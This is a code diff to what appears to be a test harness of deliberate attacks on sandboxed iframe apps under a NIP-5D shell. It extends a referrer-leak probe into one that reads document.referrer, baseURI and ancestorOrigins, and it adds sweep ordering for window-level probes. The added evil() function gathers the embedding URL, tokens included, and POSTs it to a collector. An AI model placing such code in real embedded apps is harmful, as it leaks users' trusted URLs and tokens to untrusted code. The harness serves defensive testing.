@@ -126,6 +126,7 @@
   .chip.sev-critical { color: var(--danger); }
   .chip.sev-high { color: var(--warn); }
   .chip.sev-info { color: var(--muted); }
+  .chip.window-level { color: var(--muted); border-style: dashed; }
   .evidence {
     color: var(--muted);
     font-size: 11px;
@@ -623,19 +624,32 @@ const ATTACKS = [
   },
   {
     id: 'referrer',
-    name: 'referrer leak',
-    target: 'NIP-5D is silent on Referrer-Policy',
+    name: 'embedding-URL leak (referrer / baseURI / ancestorOrigins)',
+    target: 'NIP-5D is silent on Referrer-Policy — and referrer is not the only channel',
     severity: 'high',
-    harm: 'document.referrer inside the srcdoc frame is the shell\'s URL — query tokens included. Leaks a trusted URL to untrusted code.',
-    evilBrief: 'Reads document.referrer (the full shell URL) and POSTs it to the collector.',
+    harm: 'The shell\'s URL and origin leak into the srcdoc frame three ways: document.referrer (the shell URL, query tokens included), document.baseURI (the FULL embedding URL incl path/query/fragment for srcdoc — no Referrer-Policy touches it; only a host <base href> changes it), and location.ancestorOrigins (the embedding origin). Each leaks a trusted URL/origin to untrusted code.',
+    evilBrief: 'Reads document.referrer, document.baseURI, and location.ancestorOrigins (the full embedding URL + origin) and POSTs them to the collector.',
     async demo() {
       const r = document.referrer;
-      if (!r || r === 'about:srcdoc') return blocked('referrer is ' + (r ? 'about:srcdoc' : 'empty') + ' — no shell URL leaked into the frame');
-      return armed('referrer leaks the shell URL: ' + mask(r, 40));
+      const base = safeGet(() => document.baseURI);
+      const anc = safeGet(() => (location.ancestorOrigins ? Array.from(location.ancestorOrigins) : null));
+      const leaks = [];
+      if (r && r !== 'about:srcdoc') leaks.push('document.referrer=' + mask(r, 40));
+      // baseURI carries the FULL embedding URL for a srcdoc frame — no
+      // Referrer-Policy reduces it; only a host-page <base href> changes it.
+      if (base && base !== 'about:srcdoc' && !/^(data|blob):/.test(base)) leaks.push('document.baseURI=' + mask(base, 40));
+      if (anc && anc.length) leaks.push('location.ancestorOrigins[0]=' + mask(anc[0], 32));
+      return leaks.length
+        ? armed('embedding URL/origin leaks into the frame via ' + leaks.join(' · ') + ' — document.referrer is NOT the whole story: baseURI carries the full embedding URL (path/query/fragment) for srcdoc with no Referrer-Policy over it, and ancestorOrigins leaks the embedding origin. A no-referrer iframe attr / host <meta referrer> only touch referrer.')
+        : blocked('no embedding URL leaked — referrer empty/about:srcdoc, baseURI not the shell URL, ancestorOrigins empty/unsupported');
     },
     async evil() {
-      const out = { referrer: document.referrer };
-      out.exfil = await sendToCollector('referrer', out);
+      const out = {
+        referrer: document.referrer,
+        baseURI: safeGet(() => document.baseURI),
+        ancestorOrigins: safeGet(() => (location.ancestorOrigins ? Array.from(location.ancestorOrigins) : 'unsupported')),
+      };
+      out.exfil = await sendToCollector('embedding-url', out);
       return out;
     },
   },
@@ -703,12 +717,14 @@ const ATTACKS = [
       const div = document.createElement('div');
       div.className = 'attack' + (r.status === 'armed' || r.status === 'sent' ? ' ' + r.status : '');
       div.dataset.attack = a.id;
+      if (a.windowLevel) div.dataset.windowLevel = '1';
       div.dataset.status = r.status || (a.autoRun === false ? 'ready' : 'pending');
       div.innerHTML =
         '<div class="attack-head">' +
           statusChip(r.status) +
           '<span class="attack-name">' + esc(a.name) + '</span>' +
           sevChip(a.severity) +
+          (a.windowLevel ? '<span class="chip window-level" title="posts a window-level message to the parent: runs last in the sweep (a port-bound NIP-5D shell may revoke on it)">window-level</span>' : '') +
           '<span class="spacer"></span>' +
           '<div class="row-actions"><button data-probe="' + a.id + '" type="button">' + (a.autoRun === false ? 'detonate' : 'probe') + '</button></div>' +
         '</div>' +
@@ -770,8 +786,26 @@ const ATTACKS = [
     render();
     updateReport();
   }
+  /* window-level rows (windowLevel: true) post a message to the parent
+     Window instead of riding the injected API / napplet.hello port. A
+     port-bound NIP-5D shell may treat that as replacement evidence and revoke
+     (tearing this frame down), so the sweep runs them LAST, or not at all
+     with evil-window-level=skip (napplet/evil#3). Manual probes still run. */
+  function windowLevelMode() {
+    const v = String(evilParam('evil-window-level') || '').trim().toLowerCase();
+    return v === 'skip' ? 'skip' : 'last';
+  }
   async function runAllDemos() {
-    for (const a of ATTACKS) if (a.autoRun !== false) await runDemo(a.id);
+    const auto = ATTACKS.filter((a) => a.autoRun !== false);
+    const late = auto.filter((a) => a.windowLevel);
+    if (windowLevelMode() === 'skip') {
+      for (const a of late) state.results[a.id] = na('skipped: window-level probe (evil-window-level=skip) — a port-bound NIP-5D shell may revoke on it; use the probe button to run it');
+      render();
+      updateReport();
+    }
+    for (const a of auto) if (!a.windowLevel) await runDemo(a.id);
+    if (windowLevelMode() === 'skip') return;
+    for (const a of late) await runDemo(a.id);
   }
 
   /* ---------- VERY EVIL ---------- */
